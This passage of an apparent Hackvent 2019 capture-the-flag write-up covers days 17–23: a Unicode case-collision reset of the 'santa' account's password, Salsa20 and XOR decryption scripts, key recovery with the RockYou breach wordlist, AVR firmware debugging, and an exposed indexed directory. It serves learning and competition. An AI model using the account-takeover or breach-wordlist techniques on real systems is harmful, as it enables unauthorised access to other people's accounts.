+<p>After some research (<a href="https://bugs.mysql.com/bug.php?id=19567">https://bugs.mysql.com/bug.php?id=19567</a>) on MySQL vulnerabilities, it became clear that case transforms are not done correctly. An "ä", if transformed to uppercase, becomes an "A" (just like a regular "a"). Another variant would have been to use <code>ſ</code> which becomes <code>S</code> when transformed to uppercase. The following link lists qute some of these unicode collisions: <a href="https://eng.getwisdom.io/awesome-unicode/">https://eng.getwisdom.io/awesome-unicode/</a></p>
+<p>With that, we could create a user "säntä", and with that update the "santa" user's password, which lets one log in with the newly set password and get the fläg.</p>
+<p><img src="./HV19.17_flag.png" alt="The fläg" /></p>
+<p>Fun fact: On that same day, there was an article on the HackerNews frontpage about <a href="https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/">"Hacking GitHub"</a> with unicode characters. Turns out, copy&amp;pasting from that article the charcter "ſ" (which becomes an "S" if turned into upper case) solved that day's challenge, too. Feel free, if you want to participate in the <a href="https://news.ycombinator.com/item?id=21809390">discussion</a>.</p>
+<h2 id="fläg">Fläg</h2>
+<pre><code>HV19{h4v1ng_fun_w1th_un1c0d3}
+</code></pre>
+<h1 id="hv1918---dance-with-me">HV19.18 - Dance with me</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>hardlock</td>
+<td>hard</td>
+<td>fun; crypto; reverse engineering</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-17">Given</h2>
+<p>Santa had some fun and created todays present with a special dance. this is what he made up for you:</p>
+<pre><code>096CD446EBC8E04D2FDE299BE44F322863F7A37C18763554EEE4C99C3FAD15
+</code></pre>
+<p>Dance with him to recover the flag.</p>
+<p><a href="93d0df60-3579-4672-8efc-f32327d3643f.zip">HV19-dance.zip</a></p>
+<h2 id="approach-15">Approach</h2>
+<p>After unzipping, a file named <code>dance</code> was presented. This file apparently was a Debian package:</p>
+<div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1"></a>$ <span class="ex">dpkg</span> --contents dance</span>
+<span id="cb37-2"><a href="#cb37-2"></a><span class="ex">drwxr-xr-x</span> root/wheel        0 2019-12-14 13:52 .</span>
+<span id="cb37-3"><a href="#cb37-3"></a><span class="ex">drwxr-xr-x</span> root/wheel        0 2019-12-14 13:52 ./usr</span>
+<span id="cb37-4"><a href="#cb37-4"></a><span class="ex">drwxr-xr-x</span> root/wheel        0 2019-12-14 13:52 usr/bin</span>
+<span id="cb37-5"><a href="#cb37-5"></a><span class="ex">-rwxr-xr-x</span> root/wheel   197728 2019-12-14 13:52 usr/bin/dance</span></code></pre></div>
+<p>Once unpacked (with <code>dpkg-deb -x</code>), an ARMv7 executable was written to disk:</p>
+<div class="sourceCode" id="cb38"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1"></a>$ <span class="fu">file</span> dance </span>
+<span id="cb38-2"><a href="#cb38-2"></a><span class="ex">dance</span>: Mach-O universal binary with 3 architectures: [armv7:Mach-O armv7 executable, flags:<span class="op">&lt;</span>NOUNDEFS<span class="kw">|</span><span class="ex">DYLDLINK</span><span class="kw">|</span><span class="ex">TWOLEVEL</span><span class="kw">|</span><span class="ex">PIE</span><span class="op">&gt;</span>] [arm64:Mach-O 64-bit arm64 executable, flags:<span class="op">&lt;</span>NOUNDEFS<span class="kw">|</span><span class="ex">DYLDLINK</span><span class="kw">|</span><span class="ex">TWOLEVEL</span><span class="kw">|</span><span class="ex">PIE</span><span class="op">&gt;</span>] [arm64:Mach-O 64-bit arm64 executable, flags:<span class="op">&lt;</span>NOUNDEFS<span class="kw">|</span><span class="ex">DYLDLINK</span><span class="kw">|</span><span class="ex">TWOLEVEL</span><span class="kw">|</span><span class="ex">PIE</span><span class="op">&gt;</span>]</span></code></pre></div>
+<p>Meanwhile, the challenge author provided the following iPhone screenshot along with the hint: "<em>just a big hint maybe: dance is nothing home made. its a public algorithm and when you understood that, it should be rather easy</em>"</p>
+<p><img src="dance_iphone_screenshot.png" alt="iPhone screenshot" /></p>
+<p>In parallel, with <em>mcia</em> we brainstormed some "dance-y" ciphers. We came up with <a href="https://en.wikipedia.org/wiki/Salsa20">Salsa20</a>, ChaCha20, Rumba20, etc.</p>
+<p>In the decompiled version of the binary (pay attention to the architecture, it's 64-bit), somewhere in the <code>__dance_words</code> function, bits were shifted to the right by 0x19, 0x17 and 0x13 positions. On a word value, which is 32 bit wide (the value of a register), this corresponds to bit shifts to the left by 0x7, 0x9 and 0xD poistions, which is exactly what Salsa20 does.</p>
+<p><img src="HV19.18_dance-words-bit-shifts.png" alt="Dancing bit shifts" /></p>
+<p>So, let's assume it's Salsa20. With this assumption, we can go back to the main method and find out about the nonce and the secret being used.</p>
+<p><img src="HV19.18_dance-main-disassembly.jpg" alt="Preparing main" /></p>
+<p>Finding the nonce is pretty straight forward. There is an immediate value (<code>0xb132d0a8e78f4511</code>) passed to the <code>_dance</code> function.</p>
+<p>The secret gets loaded between addresses 0x0100007da4 and 0x0100007dbc. There, a memory location is stored in x8 using an immediate value. After the <code>nop</code> instruction, two quad-word registers (2 * 4 * 32 bit = 32 bytes) are populated and stored on the stack. This happens a second time without offset, and that's when our secret gets loaded.</p>
+<p>Finally, the secret is <code>0x0320634661b63cafaa76c27eea00b59bfb2f7097214fd04cb257ac2904efee46</code>.</p>
+<p>To solve, I wrote a python solver leveraging <a href="https://pycryptodome.readthedocs.io/en/latest/src/cipher/salsa20.html">PyCryptodome's Salsa20 implementation</a>:</p>
+<div class="sourceCode" id="cb39"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb39-1"><a href="#cb39-1"></a><span class="co">#!/usr/bin/env python</span></span>
+<span id="cb39-2"><a href="#cb39-2"></a></span>
+<span id="cb39-3"><a href="#cb39-3"></a><span class="im">from</span> Cryptodome.Cipher <span class="im">import</span> Salsa20</span>
+<span id="cb39-4"><a href="#cb39-4"></a><span class="im">import</span> base64</span>
+<span id="cb39-5"><a href="#cb39-5"></a></span>
+<span id="cb39-6"><a href="#cb39-6"></a>nonce <span class="op">=</span> base64.b16decode(b<span class="st">&#39;11458fe7a8d032b1&#39;</span>, casefold<span class="op">=</span><span class="va">True</span>)</span>
+<span id="cb39-7"><a href="#cb39-7"></a>secret <span class="op">=</span> base64.b16decode(b<span class="st">&#39;0320634661b63cafaa76c27eea00b59bfb2f7097214fd04cb257ac2904efee46&#39;</span>, casefold<span class="op">=</span><span class="va">True</span>)</span>
+<span id="cb39-8"><a href="#cb39-8"></a></span>
+<span id="cb39-9"><a href="#cb39-9"></a><span class="co"># Confirm the hint; needs to print the cleartext again</span></span>
+<span id="cb39-10"><a href="#cb39-10"></a>cipher <span class="op">=</span> Salsa20.new(key<span class="op">=</span>secret, nonce<span class="op">=</span>nonce)</span>
+<span id="cb39-11"><a href="#cb39-11"></a>test_cleartext <span class="op">=</span> b<span class="st">&quot;fakeflagfakeflag&quot;</span></span>
+<span id="cb39-12"><a href="#cb39-12"></a>test_ciphertext <span class="op">=</span> base64.b16decode(b<span class="st">&#39;275b8e1af6e0e0442a8e2c99dd7032231a&#39;</span>, casefold<span class="op">=</span><span class="va">True</span>)</span>
+<span id="cb39-13"><a href="#cb39-13"></a><span class="bu">print</span>(cipher.decrypt(test_ciphertext))</span>
+<span id="cb39-14"><a href="#cb39-14"></a></span>
+<span id="cb39-15"><a href="#cb39-15"></a>ciphertext <span class="op">=</span> base64.b16decode(b<span class="st">&#39;096CD446EBC8E04D2FDE299BE44F322863F7A37C18763554EEE4C99C3FAD15&#39;</span>, casefold<span class="op">=</span><span class="va">True</span>)</span>
+<span id="cb39-16"><a href="#cb39-16"></a>cipher <span class="op">=</span> Salsa20.new(key<span class="op">=</span>secret, nonce<span class="op">=</span>nonce)</span>
+<span id="cb39-17"><a href="#cb39-17"></a><span class="bu">print</span>(<span class="bu">str</span>(cipher.decrypt(ciphertext)))</span>
+<span id="cb39-18"><a href="#cb39-18"></a><span class="co"># Prints the flag: HV19{Danc1ng_Salsa_in_ass3mbly}</span></span></code></pre></div>
+<p>For going through the assembly, <a href="http://infocenter.arm.com/help/index.jsp">http://infocenter.arm.com/help/index.jsp</a> was a good resource to understand what's going on.</p>
+<p>Also, it was crucial to configure the right architecture (<code>AArch64</code>) to be used by the disassembler.</p>
+<h2 id="flag-16">Flag</h2>
+<p><code>HV19{Danc1ng_Salsa_in_ass3mbly}</code></p>
+<h1 id="hv1919---">HV19.19 - 🎅</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>M.</td>
+<td>hard</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-18">Given</h2>
+<p>🏁🍇🎶🔤🐇🦁🍟🗞🍰📘🥖🖼🚩🥩😵⛺❗️🥐😀🍉🥞🏁👉️🧀🍎🍪🚀🙋🏔🍊😛🐔🚇🔷🎶📄🍦📩🍋💩⁉️🍄🥜🦖💣🎄🥨📺🥯📽🍖🐠📘👄🍔🍕🐖🌭🍷🦑🍴⛪🤧🌟🔓🔥🎁🧦🤬🚲🔔🕯🥶❤️💎📯🎙🎚🎛📻📱🔋😈🔌💻🐬🖨🖱🖲💾💿🧮🎥🎞🔎💡🔦🏮📔📖🏙😁💤👻🛴📙📚🥓📓🛩📜📰😂🍇🚕🔖🏷💰⛴💴💸🚁🥶💳😎🖍🚎🥳📝📁🗂🥴📅📇📈📉📊🔒⛄🌰🕷⏳📗🔨🛠🧲🐧🚑🧪🐋🧬🔬🔭📡🤪🚒💉💊🛏🛋🚽🚿🧴🧷🍩🧹🧺😺🧻🚚🧯😇🚬🗜👽🔗🧰🎿🛷🥌🎯🎱🎮🎰🎲🏎🥵🧩🎭🎨🧵🧶🎼🎤🥁🎬🏹🎓🍾💐🍞🔪💥🐉🚛🦕🔐🍗🤠🐳🧫🐟🖥🐡🌼🤢🌷🌍🌈✨🎍🌖🤯🐝🦠🦋🤮🌋🏥🏭🗽⛲💯🌁🌃🚌📕🚜🛁🛵🚦🚧⛵🛳💺🚠🛰🎆🤕💀🤓🤡👺🤖👌👎🧠👀😴🖤🔤 ❗️➡️ ㉓ 🆕🍯🐚🔢🍆🐸❗️➡️ 🖍🆕㊷ 🔂 ⌘ 🆕⏩⏩ 🐔🍨🍆❗️ 🐔㉓❗️❗️ 🍇 ⌘ ➡️🐽 ㊷ 🐽 ㉓ ⌘❗️❗️🍉 🎶🔤🍴🎙🦖📺🍉📘🍖📜🔔🌟🦑❤️💩🔋❤️🔔🍉📩🎞🏮🌟💾⛪📺🥯🥳🔤 ❗️➡️ 🅜 🎶🔤💐🐡🧰🎲🤓🚚🧩🤡🔤 ❗️➡️ 🅼 😀 🔤 🔒 ➡️ 🎅🏻⁉️ ➡️ 🎄🚩 🔤❗️📇🔪 🆕 🔡 👂🏼❗️🐔🍨🍆❗️🐔🍨👎🍆❗️❗️❗️ ➡️ 🄼 ↪️🐔🄼❗️🙌 🐔🍨🍆❗️🍇🤯🐇💻🔤👎🔤❗️🍉 ☣️🍇🆕🧠🆕🐔🅜❗️❗️➡️ ✓🔂 ⌘ 🆕⏩⏩🐔🍨🍆❗️🐔🅜❗️❗️🍇🐽 ㊷ 🐽 🅜 ⌘❗️❗️ ➡️ ⌃🐽 🄼 ⌘ 🚮🐔🄼❗️❗️➡️ ^💧🍺⌃➖🐔㉓❗️➗🐔🍨👎👍🍆❗️❗️❌^❌💧⌘❗️➡️ ⎈ ↪️ ⌘ ◀ 🐔🅼❗️🤝❎🍺🐽 ㊷ 🐽 🅼 ⌘❗️❗️➖ 🤜🤜 🐔🅜❗️➕🐔🅜❗️➖🐔🄼❗️➖🐔🅼❗️➕🐔🍨👍🍆❗️🤛✖🐔🍨👎👎👎🍆❗️🤛 🙌 🔢⎈❗️❗️🍇 🤯🐇💻🔤👎🔤❗️🍉✍✓ ⎈ ⌘ 🐔🍨👎🍆❗️❗️🍉🔡🆕📇🧠✓ 🐔🅜❗️❗️❗️➡️ ⌘↪️⌘ 🙌 🤷‍♀️🍇🤯🐇💻🔤👎🔤❗️🍉😀🍺⌘❗️🍉 🍉</p>
+<h2 id="approach-16">Approach</h2>
+<p>Emojis, yay! Well, with Hackvent you get used to search for things by appending "vulnerability" or "lang". So it was in this case. Not loong after starting the work, I stumbled on <a href="https://www.emojicode.org/">https://www.emojicode.org/</a> (not to be confused with Mozilla's <a href="https://codemoji.org/">https://codemoji.org/</a>).</p>
+<p>On that page, one can learn about programming with emojis. Which, to be honest, is not reeeaally something that you'd use in your everyday's work.</p>
+<p>After compiling the above program withe the provided codec, an executable was generated. It printed a couple of emojis and expected an input:</p>
+<p>🔒 ➡️ 🎅🏻⁉️ ➡️ 🎄🚩</p>
+<p>Which can probably be read as "things are locked, then Santa does something, then there's Christmas and a flag.".</p>
+<p>If a wrong input was supplied, a 🤯 was displayed.</p>
+<p>After some "source code" reversing and with a bit of luck, I found out, that there was only one character expected.</p>
+<p>With some guessing (which could probably be done through brute forcing), I found out a 🔑 was expected, which then printed the flag.</p>
+<h2 id="flag-17">Flag</h2>
+<p><code>HV19{*&lt;|:-)____\o/____;-D}</code></p>
+<h1 id="hv1920---i-want-to-play-a-game">HV19.20 - i want to play a game</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>hardlock</td>
+<td>hard</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-19">Given</h2>
+<p>Santa was spying you on Discord and saw that you want something weird and obscure to reverse?</p>
+<p>your wish is my command.</p>
+<p><a href="e22163c8-e0a4-475b-aef5-6a8aba51fd93.zip">HV19-game.zip</a></p>
+<h2 id="aproach-1">Aproach</h2>
+<p>It looks like this is a Playstation 4 binary, running - well - something.</p>
+<p>Opening it with Hopper resulted in a bunch of garbage. Ghidra provided a much better disassembly out of the box, but still with some issues. For example, the <code>.rdata</code> section was incorrectly addressed with <code>0x229b</code> instead of <code>0x2000</code>. I'm still unsure why this happened.</p>
+<p>Looking at the main routine, a file was being hashed with an MD5 hash. The result was compared with some expected value.</p>
+<p>After that, values were read in from specific positions in the file, starting at <code>0x1337</code> and incrementing by <code>0x1337</code>. These values were used to repeatedly XOR a value that originally was <code>0xce55954e38c589a51b6f5e25d21d2a2b5e7b39148ed0f0f8f8a5</code>, taken from address <code>0x2000</code>.</p>
+<p>To find the file that was read, I had a look at the <code>.rdata</code> section. There was only one more string that satisfies an MD5 string, which is always 32 characters long.</p>
+<p>Also, an analysis with <code>strings</code> lead to the conclusion, that the MD5 hash had something to do with the <code>PS4UPDATE.PUP</code> file:</p>
+<div class="sourceCode" id="cb40"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1"></a>$ <span class="fu">strings</span> game <span class="kw">|</span> <span class="fu">head</span> -n 45 <span class="kw">|</span> <span class="fu">tail</span> -n 10</span>
+<span id="cb40-2"><a href="#cb40-2"></a><span class="ex">libkernel.sprx</span></span>
+<span id="cb40-3"><a href="#cb40-3"></a><span class="ex">sceKernelGetIdPs</span></span>
+<span id="cb40-4"><a href="#cb40-4"></a><span class="ex">sceKernelGetOpenPsIdForSystem</span></span>
+<span id="cb40-5"><a href="#cb40-5"></a><span class="ex">/mnt/usb0/PS4UPDATE.PUP</span></span>
+<span id="cb40-6"><a href="#cb40-6"></a><span class="ex">%02x</span></span>
+<span id="cb40-7"><a href="#cb40-7"></a><span class="ex">f86d4f9d2c049547bd61f942151ffb55</span></span>
+<span id="cb40-8"><a href="#cb40-8"></a><span class="ex">GCC</span>: (GNU) <span class="ex">7.4.0</span></span>
+<span id="cb40-9"><a href="#cb40-9"></a><span class="ex">.file</span></span>
+<span id="cb40-10"><a href="#cb40-10"></a><span class="ex">main.c</span></span>
+<span id="cb40-11"><a href="#cb40-11"></a><span class="ex">rSyscall</span></span></code></pre></div>
+<p>Indeed, a quick DuckDuckGo search for <code>f86d4f9d2c049547bd61f942151ffb55 PS4UPDATE.PUP</code> popped the following page: <a href="http://wololo.net/2018/05/28/how-to-update-your-ps4-to-firmware-5-05/">http://wololo.net/2018/05/28/how-to-update-your-ps4-to-firmware-5-05/</a></p>
+<p>I re-implemented the algo with a small python script:</p>
+<div class="sourceCode" id="cb41"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb41-1"><a href="#cb41-1"></a><span class="co">#!/usr/bin/env python</span></span>
+<span id="cb41-2"><a href="#cb41-2"></a><span class="im">import</span> base64</span>
+<span id="cb41-3"><a href="#cb41-3"></a></span>
+<span id="cb41-4"><a href="#cb41-4"></a><span class="co"># From game:0x2000</span></span>
+<span id="cb41-5"><a href="#cb41-5"></a>v <span class="op">=</span> base64.b16decode(b<span class="st">&#39;ce55954e38c589a51b6f5e25d21d2a2b5e7b39148ed0f0f8f8a5&#39;</span>, casefold<span class="op">=</span><span class="va">True</span>)</span>
+<span id="cb41-6"><a href="#cb41-6"></a></span>
+<span id="cb41-7"><a href="#cb41-7"></a><span class="co"># File needs to have md5 f86d4f9d2c049547bd61f942151ffb55</span></span>
+<span id="cb41-8"><a href="#cb41-8"></a><span class="co"># find it at http://wololo.net/2018/05/28/how-to-update-your-ps4-to-firmware-5-05/</span></span>
+<span id="cb41-9"><a href="#cb41-9"></a>filename <span class="op">=</span> <span class="st">&#39;PS4UPDATE.PUP&#39;</span></span>
+<span id="cb41-10"><a href="#cb41-10"></a></span>
+<span id="cb41-11"><a href="#cb41-11"></a>pos <span class="op">=</span> <span class="bn">0x1337</span></span>
+<span id="cb41-12"><a href="#cb41-12"></a><span class="cf">with</span> <span class="bu">open</span>(filename, mode<span class="op">=</span><span class="st">&#39;rb&#39;</span>) <span class="im">as</span> f:</span>
+<span id="cb41-13"><a href="#cb41-13"></a>    <span class="cf">while</span> pos <span class="op">!=</span> <span class="bn">0x1714908</span>:</span>
+<span id="cb41-14"><a href="#cb41-14"></a>        f.seek(pos)</span>
+<span id="cb41-15"><a href="#cb41-15"></a>        bs <span class="op">=</span> f.read(<span class="bn">0x1a</span>)</span>
+<span id="cb41-16"><a href="#cb41-16"></a>        v <span class="op">=</span> <span class="bu">bytes</span>([a <span class="op">^</span> b <span class="cf">for</span> a,b <span class="kw">in</span> <span class="bu">zip</span>(v, bs)])</span>
+<span id="cb41-17"><a href="#cb41-17"></a>        pos <span class="op">+=</span> <span class="bn">0x1337</span></span>
+<span id="cb41-18"><a href="#cb41-18"></a></span>
+<span id="cb41-19"><a href="#cb41-19"></a><span class="bu">print</span>(v)</span>
+<span id="cb41-20"><a href="#cb41-20"></a><span class="co"># Prints &quot;b&#39;HV19{C0nsole_H0mebr3w_FTW}&#39;&quot;</span></span></code></pre></div>
+<p>This was a really cool challenge, as one thing lead to another in a really smooth way.</p>
+<h2 id="flag-18">Flag</h2>
+<p><code>HV19{C0nsole_H0mebr3w_FTW}</code></p>
+<h1 id="hv1921---happy-christmas-256">HV19.21 - Happy christmas 256</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>hardlock</td>
+<td>hard</td>
+<td>fun; crypto</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-20">Given</h2>
+<p>Santa has improved since the last Cryptmas and now he uses harder algorithms to secure the flag.</p>
+<p>This is his public key:</p>
+<pre><code>X: 0xc58966d17da18c7f019c881e187c608fcb5010ef36fba4a199e7b382a088072f
+Y: 0xd91b949eaf992c464d3e0d09c45b173b121d53097a9d47c25220c0b4beb943c
+</code></pre>
+<p>To make sure this is safe, he used the NIST P-256 standard.</p>
+<p>But we are lucky and an Elve is our friend. We were able to gather some details from our whistleblower:</p>
+<ul>
+<li>Santa used a password and SHA256 for the private key (d)</li>
+<li>His password was leaked 10 years ago</li>
+<li>The password is length is the square root of 256</li>
+<li>The flag is encrypted with AES256</li>
+<li>The key for AES is derived with <code>pbkdf2_hmac</code>, salt: "TwoHundredFiftySix", iterations: <code>256*256*256</code></li>
+</ul>
+<p>Phew - Santa seems to know his business - or can you still recover this flag?</p>
+<pre><code>Hy97Xwv97vpwGn21finVvZj5pK/BvBjscf6vffm1po0=
+</code></pre>
+<h2 id="approach-17">Approach</h2>
+<p>The following image illustrates the problem at hand and shows, that the symmetric key used to encrypt the flag is protected via the elliptic curve key pair. In ECC, public and private keys are related through the given curve's (<code>NIST P-256</code>) base point <code>G</code>.</p>
+<p><img src="./HV19.21_happy_christmas_256.jpg" title="Image inspired by https://cryptobook.nakov.com/asymmetric-key-ciphers/ecc-encryption-decryption" alt="Overview" /></p>
+<p>The core problem here is, that the key generation with PBKDF2 HMAC and the given parameters is computationally expensive. So, we have to find a different way to find the right password/key.</p>
+<p>To start, I tried to leverage the given information about the password.</p>
+<p>A quick DuckDuckGo search for 10 year old password breaches brings up the RockYou breach, including over 30 Millions passwords. Since that name rang a bell, I checked the wordlists included with Kali, and indeed, there was a rockyou.txt. Filtering passwords with 16 characters results in ~118k single passwords.</p>
+<p>After some trying around, I decided to check whether a curve can be constructed with the given parameters. To do so, I generated a <a href="https://www.pycryptodome.org/en/latest/src/hash/sha256.html?highlight=sha256#Crypto.Hash.SHA256.SHA256Hash">SHA256 hash</a> for every 16-character password and attempted to construct an <a href="https://www.pycryptodome.org/en/latest/src/public_key/ecc.html?highlight=ecckey#Crypto.PublicKey.ECC.construct">ECC key</a> in combination with the given public key for each of these.</p>
+<p>Passwords that produce an hash value that does not match the given public key will fail the curve construction.</p>
+<p>Only one password did not throw an error: <code>santacomesatxmas</code> (what else...)</p>
+<p>With that password, I generated a key using <a href="https://www.pycryptodome.org/en/latest/src/protocol/kdf.html?highlight=pbkdf2#Crypto.Protocol.KDF.PBKDF2">PBKDF2</a>.</p>
+<p>To conclude, I decrypted the given ciphertext with <a href="https://www.pycryptodome.org/en/latest/src/cipher/classic.html#ecb-mode">AES ECB-mode</a> (ECB mode does not require an IV or a nonce, so it's usually the first thing to try if nothing is given).</p>
+<p>I liked this challenge a lot, since it allowed me to dive a bit deeper than usual into elliptic curve cryptography.</p>
+<h2 id="flag-19">Flag</h2>
+<pre><code>HV19{sry_n0_crypt0mat_th1s_year}
+</code></pre>
+<h2 id="foundation">Foundation</h2>
+<ul>
+<li>Curve p-256 defines a base point <code>G</code> (see <a href="https://safecurves.cr.yp.to/base.html">https://safecurves.cr.yp.to/base.html</a>)</li>
+<li><code>n</code> is the private key and <code>n*G</code> is the public key (see <a href="https://www.embedded.com/an-introduction-to-elliptic-curve-cryptography/">https://www.embedded.com/an-introduction-to-elliptic-curve-cryptography/</a>)</li>
+<li>A curve also defines a max value <code>p</code> that is prime.</li>
+<li>Encryption: Choose an ephemeral secret to produce another ephemeral public key, which is multiplied with the public key, producing an ephemeral public key: see <a href="https://cryptobook.nakov.com/asymmetric-key-ciphers/ecc-encryption-decryption#ecc-based-secret-key-derivation-example-in-python">https://cryptobook.nakov.com/asymmetric-key-ciphers/ecc-encryption-decryption#ecc-based-secret-key-derivation-example-in-python</a></li>
+<li>Decryption: multiply the encrypted emphemeral public key with the private key; get back the computed secret.</li>
+</ul>
+<h1 id="hv1922---the-command-is-lost">HV19.22 - The command... is lost</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>inik</td>
+<td>leet</td>
+<td>fun; reverse engineering</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-21">Given</h2>
+<p>Introduction Santa bought this gadget when it was released in 2010. He did his own DYI project to control his sledge by serial communication over IR. Unfortunately Santa lost the source code for it and doesn't remember the command needed to send to the sledge. The only thing left is this file: <a href="a97ef12f-c583-4c54-84e4-68eaa2737bd9.data">thecommand7.data</a></p>
+<p>Santa likes to start a new DYI project with more commands in January, but first he needs to know the old command. So, now it's on you to help out Santa.</p>
+<h2 id="approach-18">Approach</h2>
+<p>Many things seemed possible with this bunch of strangely connected strings. The pattern, however, is recurring: a colon in the beginning of the line and then some 42 hex characters.</p>
+<p>Searching for the first line of this file revealed that it was a so-called hex file.</p>
+<p>Searching a bit further, I found out that one could dump an Arduino's flash memory and the resulting data was a hex-file. Things also worked the other way around. So, I tried flashing my Arduino with that program - and things worked... I think, at least. Because effectively I did not get any output, neither on the serial interface, nor on any board LED (I did not wire anything).</p>
+<p>For flashing the hex program on my Arduino, I used the following command:</p>
+<div class="sourceCode" id="cb45"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1"></a><span class="ex">avrdude</span> -C/usr/share/arduino/hardware/tools/avrdude.conf -v -v -v -v -patmega328p -carduino -P/dev/ttyACM0 -b115200 -D -Uflash:w:./thecommand7.data:i</span></code></pre></div>
+<p>This has got to work in a different way...</p>
+<h3 id="static-analysis">Static analysis</h3>
+<p>I tried disassembling/decmpiling the program in a static way:</p>
+<p>With Ghidra...</p>
+<pre><code>89e 44f -&gt; 0
+89f 227 -&gt; ?
+8a0 450 -&gt; 1
+8a1 228 -&gt; ...
+...
+</code></pre>
+<p>With avr-objdump (produces wrong output):</p>
+<pre><code>avr-objdump -D -m avr5 thecommand7.data &gt; thecommand7.asm
+</code></pre>
+<p>With little success. So I proceeded:</p>
+<h3 id="debugging">Debugging</h3>
+<p>Debugging the program seemed more promising. As I'm not equipped to do HW debugging. I had to look for a simulator. I found the following tool:</p>
+<p>OshonSoft.com AVR Simulator IDE (see <a href="https://www.oshonsoft.com/avr.html">https://www.oshonsoft.com/avr.html</a>)</p>
+<p>By closely observing memory mutations, I noticed that there were printable characters at 0x100. Right after that section, things were initialized to 0x20. However, when keeping an eye on that part of the memory, things suddenly started changing. Thanks to the OshonSoft simulator, execution speed could be slowed down, so that I could stop the program at the right point.</p>
+<p>There was the flag, starting at <em>Internal data SRAM</em> address 0x117(-0x142):</p>
+<pre><code>48 56 31 39 7b 48 33 79 5f 53 6c 33 64 67 33 5f 6d 33 33 74 5f 6d 33 5f 61 74 5f 74 68 33 5f 6e 33 78 74 5f 63 30 72 6e 33 72 7d
+</code></pre>
+<p>This data got loaded into memory starting at address 0x0357 in the .text section.</p>
+<h3 id="additional-info-1">Additional info</h3>
+<p>ATmega328 is an <code>avr5</code> architecture (see <a href="https://www.microchip.com/webdoc/AVRLibcReferenceManual/using_tools_1using_avr_gcc_mach_opt.html">https://www.microchip.com/webdoc/AVRLibcReferenceManual/using_tools_1using_avr_gcc_mach_opt.html</a>)</p>
+<p>Side note on the AVR "abbreviation":</p>
+<pre><code>Atmel says that the name AVR is not an acronym and does not stand for anything in particular. The creators of the AVR give no definitive answer as to what the term &quot;AVR&quot; stands for.[3] However, it is commonly accepted that AVR stands for Alf and Vegard&#39;s RISC processor.[7] Note that the use of &quot;AVR&quot; in this article generally refers to the 8-bit RISC line of Atmel AVR Microcontrollers.
+</code></pre>
+<p>Source: <a href="https://en.wikipedia.org/wiki/AVR_microcontrollers">https://en.wikipedia.org/wiki/AVR_microcontrollers</a></p>
+<p>Conclusion: Stumbling over the solution is a way, too.</p>
+<h2 id="credits-2">Credits</h2>
+<p>Credits to <em>mcia</em> for helping me in keeping short the search for a suitable AVR/Arduino simulation/debugging tool.</p>
+<h2 id="flag-20">Flag</h2>
+<pre><code>HV19{H3y_Sl3dg3_m33t_m3_at_th3_n3xt_c0rn3r}
+</code></pre>
+<h1 id="hv1923---ida-pro">HV19.23 - IDA PRO</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>M.</td>
+<td>leet</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-22">Given</h2>
+<p>Today's flag is available in the Internet Data Archive (IDA).</p>
+<p><a href="http://whale.hacking-lab.com:23023/">http://whale.hacking-lab.com:23023/</a></p>
+<h2 id="approach-19">Approach</h2>
+<p>The Internet Data Archive allows to download Hackvent challenges from previous years. Every zip that is downloaded is encrypted with a different password.</p>
+<p><img src="HV19.23_internet-data-archive.png" alt="IDA-PRO" /></p>
+<p>After trying out the service, I noticed that username <code>santa</code> made the zip generation break.</p>
+<p>I therefore checked, where zips are downloaded from. It turns out, archives were downloaded from <a href="http://whale.hacking-lab.com:23023/tmp/">http://whale.hacking-lab.com:23023/tmp/</a>, which was even configured as an indexed directory.</p>
+<p>Sorting by timestamp uncovered the aldest of all zip files: <a href="Santa-data.zip"><code>Santa-data.zip</code></a>. And also a <code>phpinfo.php</code> file - yay!</p>
+<p>Knowing that a new password was generated every time a zip was requested, it was probable, that we had to analyse passwords to be able to come to conclusions about how Santa's file was encrypted.</p>
+<p>One thing to note is, that zip-files were encrypted with AES-128, which is what 7zip uses by default, I think,</p>
+<p>Here are a couple of passwords:</p>
+<pre><code>pA5XVaDjsXuU
+W6WtwyyVaHvg
+kVevKfXHpJyb
+PSaZpTVYPPBH
+qdCym8cq97Zf
+UVuQDbKHEuvv
+LZzKrb7dkW2c
+mw7YCuEL4r6q
+wUWVSQQ8B9hk
+BhcwkmsGrKyk
+PBUXS9MJqi2C
+m9FwV4kVdARQ
+WyDd4zhZYRJ4
+BPhQDDcUJVX6
+Sc8gYjTFzha8
+qkSxA3dxMv6f
+UBPLhRYVAWEQ
+8tLFFaRi3XTf
+Ep3d6yZGDKgb
+FxvvJpavwSvr
+vbMDrBfFKjUE
+A3Y8f4Yvcwyz
+Hzx8WzXuaf4F
+YVdaxXwJSkFs
+DECzwgapPE6q
+645t8TE2H7pX
